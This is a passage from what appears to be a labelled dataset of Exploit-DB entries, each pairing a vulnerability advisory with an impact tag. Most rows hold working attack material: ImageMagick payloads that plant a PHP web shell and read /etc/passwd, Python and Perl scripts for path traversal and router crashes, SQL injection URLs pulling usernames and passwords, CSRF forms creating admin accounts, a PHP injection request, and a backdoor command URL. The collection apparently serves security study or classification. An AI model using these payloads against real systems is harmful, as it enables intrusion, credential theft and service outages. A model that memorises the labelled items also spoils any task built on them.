viewbox 0 0 640 480 image over 0,0 0,0 'msl:/tmp/msl.txt' popgraphic-context  /tmp/msl.txt -=-=-=-=-=-=-=-=- <?xml version=""1.0"" encoding=""UTF-8""?> <image> <read filename=""/tmp/image.gif"" /> <write filename=""/var/www/shell.php"" /> </image>  /tmp/image.gif - image with php shell inside (https://www.secgeek.net/POC/POC.gif for example)  $ convert file_move.mvg out.png # moves /tmp/image.gif to /var/www/shell.php  5. CVE-2016-3717 - Local file read (independently reported by original research author - https://hackerone.com/stewie) It is possible to get content of the files from the server by using ImageMagick's 'label' pseudo protocol:  file_read.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'label:@...c/passwd' pop graphic-context  $ convert file_read.mvg out.png # produces file with text rendered from /etc/passwd   How to mitigate the vulnerability.  Available patches appear to be incomplete. If you use ImageMagick or an affected library, we recommend you mitigate the known vulnerabilities by doing at least one these two things (but preferably both!): 1. Verify that all image files begin with the expected �magic bytes� corresponding to the image file types you support before sending them to ImageMagick for processing. (see FAQ for more info) 2. Use a policy file to disable the vulnerable ImageMagick coders. The global policy for ImageMagick is usually found in �/etc/ImageMagick�. This policy.xml example will disable the coders EPHEMERAL, URL, MVG, and MSL:  <policymap>     <policy domain=""coder"" rights=""none"" pattern=""EPHEMERAL"" />     <policy domain=""coder"" rights=""none"" pattern=""URL"" />     <policy domain=""coder"" rights=""none"" pattern=""HTTPS"" />     <policy domain=""coder"" rights=""none"" pattern=""MVG"" />     <policy domain=""coder"" rights=""none"" pattern=""MSL"" /> </policymap>   Vulnerability Disclosure Timeline: April, 21 2016 - file read vulnerability report for one of My.Com services from https://hackerone.com/stewie received by Mail.Ru Security Team. Issue is reportedly known to ImageMagic team. April, 21 2016 - file read vulnerability patched by My.Com development team April, 28 2016 - code execution vulnerability in ImageMagick was found by Nikolay Ermishkin from Mail.Ru Security Team while researching original report April, 30 2016 - code execution vulnerability reported to ImageMagick development team April, 30 2016 - code execution vulnerability fixed by ImageMagick (incomplete fix) April, 30 2016 - fixed ImageMagic version 6.9.3-9 published (incomplete fix) May, 1 2016 - ImageMagic informed of the fix bypass May, 2 2016 - limited disclosure to 'distros' mailing list May, 3 2016 - public disclosure at https://imagetragick.com/",code execution,1
32712,"IBM Websphere DataPower XML Security Gateway 3.6.1 XS40 - Remote Denial of Service source: https://www.securityfocus.com/bid/33169/info  IBM WebSphere DataPower XML Security Gateway XS40 is prone to a remote denial-of-service vulnerability because it fails to handle user-supplied input.  Remote attackers can exploit this issue to cause the device to reboot, denying service to legitimate users.  WebSphere DataPower XML Security Gateway XS40 with firmware 3.6.1.5 is affected; other versions may also be vulnerable.   The following string is sufficient to trigger this issue:  ?abc?",denial-of-service,1
36903,"Grindr 2.1.1 iOS - Denial of Service Document Title: =============== Grindr 2.1.1 iOS Bug Bounty #2 - Denial of Service Software Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1418   Release Date: ============= 2015-05-02   Vulnerability Laboratory ID (VL-ID): ==================================== 1418   Common Vulnerability Scoring System: ==================================== 3.3   Product & Service Introduction: =============================== Grindr, which first launched in 2009, has exploded into the largest and most popular all-male location-based social network out there.  With more than 5 million guys in 192 countries around the world -- and approximately 10,000 more new users downloading the app  every day -- you’ll always find a new date, buddy, or friend on Grindr. Grindr is a simple app that uses your mobile device’s  location-based services to show you the guys closest to you who are also on Grindr. How much of your info they see is  entirely your call.  (Copy of the Vendor Homepage: http://grindr.com/learn-more )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research Team discovered a local and remote denial of servie vulnerability in the official  Grindr v2.1.1 iOS mobile web-application.   Vulnerability Disclosure Timeline: ================================== 2015-01-22: Researcher Notification & Coordination (Benjamin Kunz Mejri - Evolution Security) 2015-01-22: Vendor Notification (Grinder - Bug Bounty Program) 2015-02-02: Vendor Response/Feedback (Grinder - Bug Bounty Program) 2015-04-01: Vendor Fix/Patch (Grindr Developer Team - Reward: x  & Manager: x) 2015-05-04: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Grindr LLC Product: Grinder - iOS Mobile Web Application (API) 2.2.1   Exploitation Technique: ======================= Remote   Severity Level: =============== Medium   Technical Details & Description: ================================ A local and remote Denial of Service vulnerability has been discovered in the official Grindr v2.1.1 iOS mobile web-application.  The attacker injects a script code tag or multiple termination strings (%00%20%00%20%00) to the Display Name input field of the Edit Profile module. After the inject the service stored the malicious values as DisplayName. After the inject a random user is processing to click in the profile the contact information (facebook/twitter). After that the victim wants to copy the link and an internal service corruption occurs thats crashs the mobile app. The issue is local and remote exploitable.  Vulnerable Module(s): [+] Edit Profile  Vulnerable Parameter(s): (Input) [+] Display Name  Affected Module(s): [+] Contact > Social Network > Copy Link    Proof of Concept (PoC): ======================= The denial of service web vulnerability can be exploited by remote attacker and local user accounts with low user interaction (click). To demonstrate the vulnerability or to reproduce the issue follow the provided information and steps below to continue.  Manual steps to reproduce ... 1. Open the grindr mobile application 2. Inject a script code tag as Display Name or use the terminated String with empty values 3. Save and click in the profile the contact button (exp. facebook) 4. Click to the send button ahead and push the Copy Link function 5. The app service is getting terminated with an uncaught exception because of an internal parsing error  Note:To exploit the issue remotly the profile needs to be shared with another user and then the user only needs to push the same way the social contact button.  PoC Video:    Solution - Fix & Patch: ======================= First step is to prevent the issue by a secure restriction of the input. Attach a own excpetion-handling to prevent next to the insert itself.  The social network accounts that are linked do not allow special chars in the username. The grindr ios app and the android app allows to register  an account and to insert own scripts <html5> or null strings that corrupts the process of copy the link by an error. After the restriction has been  set in the code of both (api) the issue can not anymore execute to shutdown anothers users account. Even if this issue execution is prevented that  was only a solution to prevent.   To fix the bug ... Connect for example ios device with the running app to windows. Sync the process and reproduce the remote error and local error. Move to the iOS error  folder that has been synced. Get the error attach another debugger and so on ...   Security Risk: ============== The secuirty risk of the local and remote denial of service vulnerability in the copy link function that corrupts is estimated as medium.   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed  or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable  in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab  or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for  consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses,  policies, deface websites, hack into databases or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to  electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website  is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact  (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™  --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt",denial of service,1
46494,"MarcomCentral FusionPro VDP Creator < 10.0 - Directory Traversal #!/usr/bin/env python  ''' # Exploit Title: MarcomCentral FusionPro VDP Creator < 10.0 - Directory Traversal # Date: 02/11/2019  # Exploit Author: 0v3rride # Vendor Homepage: https://marcom.com/ # Software Link: http://static.pti.com/downloads/FusionPro/Win32/FusionPro_9.3.36_Setup.exe # Version: < 10.0 (version tested was 9.3) # Executable/Service: FPProducerInternetServer.exe v9.03.0036.0000 (FusionPro Internet Request Handler) # Tested on: Windows # CVE : 2019-7751  Summary A directory traversal and local file inclusion vulnerability in the FPProducerInternetServer.exe service/utility in Ricoh MarcomCentral's, formerly PTI Marketing, FusionPro VDP Creator allows a remote attacker to list or enumerate sensitive contents of files. Furthermore, this could allow for privilege escalation by dumping the local machine's SAM and SYSTEM database files, access to common files that contain plaintext credentials, and possibly remote code execution.  Attack Details Exploiting this vulnerability is extremely simple. This could be done from a browser like Firefox. Simply navigate the affected host (e.g. <http://><host.domain.tld>:<port#>/Windows/System32/drivers/etc/hosts. No slash-dot-dots (/../..) are required, but you can add some if you want. Note that the slashes are forward slashes! By default, the service sets up a listener on port 8080.  Vendor Response The response I've received from the vendor suggests that they care very little about the issue despite the criticality of this class of vulnerability. I'll quote the vendors response, ""just delete it"". Delete what exactly? Uninstall FusionPro VDP Creator? Or should one just delete FPProducerInternetServer.exe? The vendor also wasn't clear if any of the more current versions (10.0 and 10.1) are affected. All that was sent was, ""since v9.3 there have been changes to this utility to restrict access to folders"". It is possible that these versions are also susceptible to the issue as well based on the response from the vendor.  Resolution Thankfully I found some better solutions other than ""just delete it"".      Open services.msc     Look for the service named FusionPro Internet Request Handler     Right-click and open the properties Window     Stop the service if it's running     Select disabled startup type  Or you could write a PowerShell script that does it automatically for you using the set-service and get-service cmdlets.  The nuclear option would be deleting the following executable, C:\Windows\SysWOW64\FPProducerInternetServer.exe. However, I don't know what affect this will have on the machine and FusionPro VDP Creator software. You could take a gamble and upgrade to the latest version . '''  ####################### #   PoC by: 0v3rride  # #  DoC: February 2019 # #######################  from requests import * from sys import *;   def travel(fullurl):     r = get(fullurl);     print(""-"" * 80 + ""\n[i]: Supplied URL: {}"".format(fullurl))     print(""-"" * 80 + ""\n[i]: Response Status Code: {}"".format(r.status_code));     print(""-"" * 80 + ""\n[i]: Response Headers:\n"");      for hdr in r.headers:         print(""{}: {}"".format(hdr, r.headers[hdr]));      print(""-"" * 80 + ""\n[i]: RAW DATA RETURNED FROM RESPONSE: \n{}"".format(r.text));   if len(argv) < 3:     print(""[i]: Usage -- ./poc <http(s)://FQDN or http(s)://<IP address>:<Port #> <file to query on the local machine that is affected (e.g. /windows/system32/drivers/etc/hosts)"");     print(""[i]: Path needs to start with a '/'.""); else:     try:         print(""[i]: https://github.com/0v3rride/"");         print(""-"" * 80 + ""\n[!] Sending the request..."");         travel(argv[1] + argv[2]);     except RequestException as re:         print(re.strerror);     finally:         print(""-"" * 80 + ""\n[!] Done!"");",privilege escalation,1
29702,WordPress Core 2.1.1 - '/wp-includes/theme.php?iz' Arbitrary Command Execution source: https://www.securityfocus.com/bid/22797/info   An attacker compromised the source code for Wordpress 2.1.1 and altered it to include a malicious backdoor. This backdoor introduces a code-execution vulnerability that will let remote users inject PHP code or execute operating system commands.   The vendor has acknowledged this vulnerability and recommends that all users who have installed version 2.1.1 upgrade to version 2.1.2 or later. This issue appears limited to the 2.1.1 release.   http://www.example.com/wp-includes/theme.php?iz=cat /etc/passwd,inject PHP code or execute operating system commands,1
19555,"Lucent Ascend MAX 5.0/Pipeline 6.0/TNT 1.0/2.0 Router - MAX UDP Port 9 (2) source: https://www.securityfocus.com/bid/714/info   Certain versions of Ascends (Lucent) router software listen on port 9 (UDP Discard). Ascend provides configuration tools for MAX and Pipeline routers that locate locally installed routers by broadcasting a specially formatted packet to UDP port 9. An attacker can send a similar but malformed packet to the same port that will cause MAX and Pipeline routers running certain software versions to crash.   #!/usr/bin/perl                      #                     # Ascend Kill II - perl version                     # (C) 1998 Rootshell - http://www.rootshell.com/ - <info@rootshell.com>                     #                     # Released: 3/17/98                     #                     # Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues                     # (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html)                     #                     #  NOTE: This program is NOT to be used for malicous purposes.  This is                     #        intenteded for educational purposes only.  By using this program                     #        you agree to use this for lawfull purposes ONLY.                     #                     #                      use Socket;                      require ""getopts.pl"";                      sub AF_INET {2;}                     sub SOCK_DGRAM {2;}                      sub ascend_kill {                       $remotehost = shift(@_);                       chop($hostname = `hostname`);                       $port = 9;                       $SIG{'INT'} = 'dokill';                       $sockaddr = 'S n a4 x8';                       ($pname, $aliases, $proto) = getprotobyname('tcp');                       ($pname, $aliases, $port) = getservbyname($port, 'tcp')                       unless $port =~ /^\d+$/;                       ($pname, $aliases, $ptype, $len, $thisaddr) =                       gethostbyname($hostname);                       $this = pack($sockaddr, AF_INET, 0, $thisaddr);                       ($pname, $aliases, $ptype, $len, $thataddr) = gethostbyname($remotehost);                       $that = pack($sockaddr, AF_INET, $port, $thataddr);                       socket(S, &AF_INET, &SOCK_DGRAM, 0);                         $msg = pack(""c64"",                         0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,                         0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,                         0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,                         0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,                         0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,                         0x50, 0x41, 0x53, 0x53);                       for ($i=0; $i<500; $i++) {                         $msg .= pack(""c1"", 0xff);                       }                       send(S,$msg,0,$that) || die ""send:$!"";                     }                      if ($ARGV[0] eq '') {                       print ""usage: akill2.pl <remote_host>\n"";                       exit;                     }                      &ascend_kill($ARGV[0]);",crash,1
36222,"Joomla! Component com_shop - 'id' SQL Injection source: https://www.securityfocus.com/bid/50043/info  The 'com_shop' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_shop&view=details&id=-29 union select 0,1,2,version(),4,5,6,7,8,9,10,11,12","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
31193,"Joomla! / Mambo Component com_omnirealestate - 'objid' SQL Injection source: https://www.securityfocus.com/bid/27783/info  The 'com_omnirealestate' component for Joomla! and Mambo is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  http://www.example.com/index.php?option=com_omnirealestate&Itemid=0&func=showObject&info=contact&objid=-9999/**/union/**/select/**/username,password/**/from/**/mos_users/*&resu lts=S@BUN","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
27365,Monopd 0.9.3 - Remote Denial of Service source: https://www.securityfocus.com/bid/16981/info  The Monopd game server is prone to a remote denial-of-service vulnerability.  A remote attacker may exploit this issue to deny service for legitimate users.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/27365.zip,denial-of-service,1
48082,"Ice HRM 26.2.0 - Cross-Site Request Forgery (Add User) # Exploit Title: Ice HRM 26.2.0 - Cross-Site Request Forgery (Add User) # Date: 2020-02-14 # Exploit Author: J3rryBl4nks # Vendor Homepage: https://icehrm.com/ # Software Link: https://sourceforge.net/projects/icehrm/#Version 26.2.0 # Tested on Windows 10/Kali Rolling  # The Ice HRM Web Application is vulnerable to CSRF that leads to arbitrary user creation or password change:  # POC for user creation:       <html>       <body>       <script>history.pushState('', '', '/')</script>         <form action=""http://HOSTHERE/icehrm/app/service.php"">           <input type=""hidden"" name=""t"" value=""User"" />           <input type=""hidden"" name=""a"" value=""ca"" />           <input type=""hidden"" name=""sa"" value=""saveUser"" />           <input type=""hidden"" name=""mod"" value=""admin&#61;users"" />           <input type=""hidden"" name=""req"" value=""&#123;""username""&#58;""test""&#44;""email""&#58;""test&#64;test&#46;com""&#44;""employee""&#58;""1""&#44;""user&#95;level""&#58;""Admin""&#44;""user&#95;roles""&#58;""&#91;&#92;""2&#92;""&#93;""&#44;""lang""&#58;""NULL""&#44;""default&#95;module""&#58;""NULL""&#44;""csrf""&#58;""c0bdded55472fab56c578386143a1854e6f8dd11""&#125;"" />           <input type=""submit"" value=""Submit request"" />         </form>       </body>     </html>  #    POC for Password Change:      <html>       <body>       <script>history.pushState('', '', '/')</script>         <form action=""http://HOSTHERE/icehrm/app/service.php"">           <input type=""hidden"" name=""t"" value=""User"" />           <input type=""hidden"" name=""a"" value=""ca"" />           <input type=""hidden"" name=""sa"" value=""changePassword"" />           <input type=""hidden"" name=""mod"" value=""admin&#61;users"" />           <input type=""hidden"" name=""req"" value=""&#123;""id""&#58;1&#44;""pwd""&#58;""admin123""&#125;"" />           <input type=""submit"" value=""Submit request"" />         </form>       </body>     </html>",arbitrary user creation or password change,1
38569,"Lokboard - 'index_4.php' PHP Code Injection source: https://www.securityfocus.com/bid/60459/info  Lokboard is prone to a remote PHP code-injection vulnerability.  An attacker can exploit this issue to inject and execute arbitrary PHP code in the context of the affected application. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.  Lokboard 1.1 is vulnerable; other versions may also be affected.   POST /lokboard/install/index_4.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://localhost/lokboard/install/index_3.php?error=1 Cookie: lang=; PHPSESSID=g4j89f6110r4hpl3bkecfpc7c1 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 90 host=localhost&user=root&pass=toor&name=lokboard&pass_key=1234"";phpinfo();//",inject and execute arbitrary PHP code in the context of the affected application,1
29048,"i-Gallery 3.4 - 'igallery.asp' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/21122/info  The i-gallery application is prone to multiple-input validation vulnerabilities, including multiple cross-site scripting vulnerabilities and an HTML-injection issue, because the software fails to sufficiently sanitize user-supplied data.  Attacker-supplied HTML and script code would execute in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.  This issue affects i-gallery 3.4 and prior versions.  http://target/path/igallery.asp?n=[XSS] http://target/path/igallery.asp&d=[XSS]",the software fails to sufficiently sanitize user-supplied data,1
24117,"Microsoft Internet Explorer 6 - Codebase Double Backslash Local Zone File Execution source: https://www.securityfocus.com/bid/10344/info  A vulnerability has been reported that may potentially permit HTML documents to gain unauthorized access to local resources by using specific syntax when referencing said resource as a value for the CODEBASE object property. Under certain conditions, this could be exploited to reference executable content on the victim system.  In particular, by pre-pending two backslash characters (\\) to the resource path, it may be possible to invoke the resource. This syntax is reportedly still valid despite patches to limit other means of allowing remote users to reference local content on client systems.  This works if the resource is invoked from the Local Zone, so other vulnerabilities are required to bypass Zone restrictions and cause malicious content to be executed in the Local Zone. BIDs 9658, 9320, 9105, and 9107 could all theoretically be exploited in combination with this issue, potentially allowing for execution of arbitrary code on the client system if properly exploited.  Attacks that exploit this issue in tandem with other vulnerabilities may be executed through Internet Explorer or HTML email via Outlook/Outlook Express.  Note: This BID initially included a proof-of-concept that was published by Roozbeh Afrasiabi that caused a .CHM file to be referenced from the Internet Zone. Further research has determined that this is a new, distinct vulnerability and BID 10348 has been created to describe this issue.   file://[SysDrive]:\\[INTERNET CACHE PATH]\CONTENT.IE5\EXE.EXE  mhtml:file://[SysDrive]:\\[INTERNET CACHE PATH]\CONTENT.IE5\MHT.MHT!file:///C:\EXE.EXE",denial of service,1
30012,"Chamilo Lms 1.9.6 - 'profile.php?password' SQL Injection Advisory ID: HTB23182 Product: Chamilo LMS Vendor: Chamilo Association Vulnerable Version(s): 1.9.6 and probably prior Tested Version: 1.9.6 Advisory Publication:  November 6, 2013  [without technical details] Vendor Notification: November 6, 2013  Vendor Patch: November 9, 2013  Public Disclosure: November 27, 2013  Vulnerability Type: SQL Injection [CWE-89] CVE Reference: CVE-2013-6787 Risk Level: Medium  CVSSv2 Base Score: 6 (AV:N/AC:M/Au:S/C:P/I:P/A:P) Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered vulnerability in Chamilo LMS, which can be exploited to perform SQL Injection attacks.   1) SQL Injection in Chamilo LMS: CVE-2013-6787  The vulnerability exists due to insufficient validation of ""password0"" HTTP POST parameter passed to ""/main/auth/profile.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The following exploitation example displays version of MySQL server:  <form action=""http://[host]/main/auth/profile.php"" method=""post"" name=""main""> <input type=""hidden"" name=""password0""  value=""' OR substring(version(),1,1)=5 -- ""> <input type=""hidden"" name=""password1""  value=""password""> <input type=""hidden"" name=""password2""  value=""password""> <input type=""hidden"" name=""apply_change""  value=""""> <input type=""hidden"" name=""firstname""  value=""first_name""> <input type=""hidden"" name=""lastname""  value=""last_name""> <input type=""hidden"" name=""username""  value=""username""> <input type=""hidden"" name=""official_code""  value=""USER""> <input type=""hidden"" name=""phone""  value=""""> <input type=""hidden"" name=""language""  value=""""> <input type=""hidden"" name=""extra_mail_notify_invitation""  value=""""> <input type=""hidden"" name=""extra_mail_notify_message""  value=""""> <input type=""hidden"" name=""extra_mail_notify_group_message""  value=""""> <input type=""hidden"" name=""_qf__profile""  value=""""> <input type=""hidden"" name=""""  value=""""> <input type=""submit"" id=""btn""> </form>   Successful exploitation of this vulnerability requires that the application is configured during installation not to encrypt users' passwords (""Encryption method"" option is set to ""none"").  -----------------------------------------------------------------------------------------------  Solution:  Edit the source code and apply changes according to vendor's instructions:.  More Information: https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues#Issue-10-2013-11-06-Moderate-risk-SQL-Injection-in-specific-unrecommended-case  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23182 - https://www.htbridge.com/advisory/HTB23182 - SQL Injection in Chamilo LMS. [2] Chamilo LMS - http://www.chamilo.org/ - Chamilo aims at bringing you the best e-learning and collaboration platform in the open source world. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® - http://www.htbridge.com/immuniweb/ - is High-Tech Bridge's proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",execute arbitrary SQL commands in application's database,1
46222,"Microsoft Windows CONTACT - HTML Injection / Remote Code Execution [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-CONTACT-FILE-HTML-INJECTION-MAILTO-LINK-ARBITRARY-CODE-EXECUTION.txt [+] ISR: ApparitionSec [+] Zero Day Initiative Program     [+] ZDI-CAN-7591   [Vendor] www.microsoft.com   [Product] Microsoft .CONTACT File  A file with the CONTACT file extension is a Windows Contact file. They're used in Windows 10, Windows 8, Windows 7, and Windows Vista. This is the folder where CONTACT files are stored by default: C:\Users\[USERNAME]\Contacts\.   [Vulnerability Type] Mailto: HTML Link Injection Remote Code Execution   [Security Issue] This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Windows. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The flaw is due to the processing of "".contact"" files, the E-mail address field takes an expected E-mail address value, however the .CONTACT file is  vulnerable to HTML injection as no validation is performed. Therefore, if an attacker references an executable file using an HREF tag it will run that instead without warning instead of performing the expected email behavior. This is dangerous and would be unexpected to an end user.  The E-mail addresses Mailto: will point to an arbitrary executable like. <a href=""calc.exe"">pwn@microsoft.com</a>  Additionally the executable file can live in a sub-directory and be referenced like ""<a href=""mydir\malicious.exe"">pwn@microsoft.com</a>"" or attackers can use directory traversal techniques to point to a malware say sitting in the targets Downloads directory like:  <a href=""..\..\..\..\Users\victim\Downloads\evil.exe"">pwn@microsoft.com</a>  Making matters worse is if the the files are compressed then downloaded ""mark of the web"" (MOTW) may potentially not work as expected using certain archive utils.  This advisory was initially one of three different vulnerabilities I reported to Zero Day Initiative Program (ZDI), that microsoft decided to not release a security fix for and close. The first cases I reported to ZDI were .VCF and .CONTACT files Website address input fields.  This example is yet another vector affecting Windows .CONTACT files and is being released as the .CONTACT file issue is now publicly known.   [Exploit/POC] Create a Windows .CONTACT file and inject the following HTML into the E-mail: field  <a href=""calc.exe"">pwn@microsoft.com</a>  Windows will prompt you like ""The e-mail address you have entered is not a valid internet e-mail address. Do you still want to add this address?""  Click Yes.  Open the .CONTACT file and click the Mailto: link BOOM! Windows calculator will execute.   Attacker supplied code is not limited to .EXE, .CPL or .COM as .VBS files will also execute! :)   [POC Video URL] https://vimeo.com/312824315   [Disclosure Timeline] Reported to ZDI 2018-11-22 (ZDI-CAN-7591) Another separate vulnerability affecting MS Windows .contact files affected the Website address input fields and was publicly disclosed January 16, 2019. https://www.zerodayinitiative.com/advisories/ZDI-19-121/ Public disclosure : January 22, 2019 	   [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).  hyp3rlinx",execute arbitrary code on vulnerable installations of Microsoft Windows,1
27945,Enigma Haber 4.2 - Cross-Site Scripting source: https://www.securityfocus.com/bid/18226/info  Enigma Haber is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/hava.asp?il=[Xss],have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site,1
40866,"NetCat 0.7.1 - Denial of Service #/usr/bin/python #-*- Coding: utf-8 -*-  ### GNU Netcat 0.7.1 - Out of bounds array write (Access Violation) by n30m1nd ###   # Date: 2016-11-19 # Exploit Author: n30m1nd # Vendor Homepage: http://netcat.sourceforge.net/ # Software Link: https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download # Version: 0.7.1 # Tested on: Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux  # Credits # ======= # Props to Giovanni and Armando creators of this useful piece of software, thank you guys! # Shouts to the crew at Offensive Security for their huge efforts on making	the infosec community better. See you at AWE!  # How to # ====== # * Get a distribution that ships with gnu netcat or Compile netcat from sources: #       * # Download #       * tar -xzf netcat-0.7.1.tar.gz #       * cd netcat-0.7.1/ #       * ./configure #       * make #       * # Netcat will be deployed in src/netcat # # * Set netcat to listen like the following: #   * ./netcat -nlvp 12347 -T # * Just run this script on a different terminal #  # Why? # ==== # When the Telnet Negotiation is activated (-T option), Netcat parses the incoming packets looking for Telnet Control Codes # by running them through buggy switch/case code.  # Aforementioned code fails to safely check for array boundaries resulting in an array out of bounds write.  # Vulnerable code # =============== # telnet.c # ... # 76   static unsigned char getrq[4]; # 77   static int l = 0; # 78   unsigned char putrq[4], *buf = ncsock->recvq.pos; # ... # 88   /* loop all chars of the string */ # 89   for (i = 0; i < ref_size; i++) { # 90     /* if we found IAC char OR we are fetching a IAC code string process it */ # 91     if ((buf[i] != TELNET_IAC) && (l == 0)) # ... #100     getrq[l++] = buf[i]; // BANG! # 99     /* copy the char in the IAC-code-building buffer */ # ... # 76   static unsigned char getrq[4]; # 77   static int l = 0; # 78   unsigned char putrq[4], *buf = ncsock->recvq.pos;  # Exploit code # ============  import socket  RHOST = ""127.0.0.1"" RPORT = 12347  print(""[+] Connecting to %s:%d"") % (RHOST, RPORT) s = socket.create_connection((RHOST, RPORT)) s.send(""\xFF"") # Telnet control character print(""[+] Telnet control character sent"") print(""[i] Starting"") try: 	i = 0 	while True: # Loop until it crashes 		i += 1 		s.send(""\x30"") except: 	print(""[+] GNU Netcat crashed on iteration: %d"") % (i)",denial of service,1
